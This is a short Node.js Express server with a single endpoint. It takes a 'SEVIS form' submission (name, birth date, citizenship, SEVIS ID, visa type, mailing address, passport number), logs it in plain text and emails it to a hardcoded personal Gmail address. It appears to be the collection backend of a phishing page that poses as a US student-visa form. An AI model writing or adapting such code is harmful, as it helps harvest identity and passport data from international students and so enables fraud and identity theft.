
require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Nodemailer transporter setup
const transporter = nodemailer.createTransport({
    service: 'Gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// API Endpoint to receive form data & send email
app.post('/send-email', async (req, res) => {
    try {
        console.log("Received form data:", req.body);
        
        const { 
            fullName, 
            dob, 
            countryBirth, 
            citizenship, 
            sevisId, 
            visaType, 
            schoolCode, 
            programNumber, 
            email, 
            mailingAddress, 
            passportNumber 
        } = req.body;
        
        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: 'Onipede.ooo@gmail.com',
            subject: 'New SEVIS Form Submission',
            text: `A user has submitted their details:
                
                Full Name: ${fullName}
                Date of Birth: ${dob}
                Country of Birth: ${countryBirth}
                Citizenship: ${citizenship}
                SEVIS ID: ${sevisId}
                Visa Type: ${visaType || 'Not specified'}
                School Code: ${schoolCode || 'Not applicable'}
                Program Number: ${programNumber || 'Not applicable'}
                Email: ${email}
                Mailing Address: ${mailingAddress}
                Passport Number: ${passportNumber || 'Not provided'}
            `
        };

        console.log("Sending email with options:", mailOptions);

        await transporter.sendMail(mailOptions);
        console.log("Email sent successfully");
        res.status(200).json({ message: 'Email sent successfully' });
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ message: 'Failed to send email', error: error.message });
    }
});

// Simple test endpoint
app.get('/test', (req, res) => {
    res.status(200).json({ message: 'Server is running correctly' });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
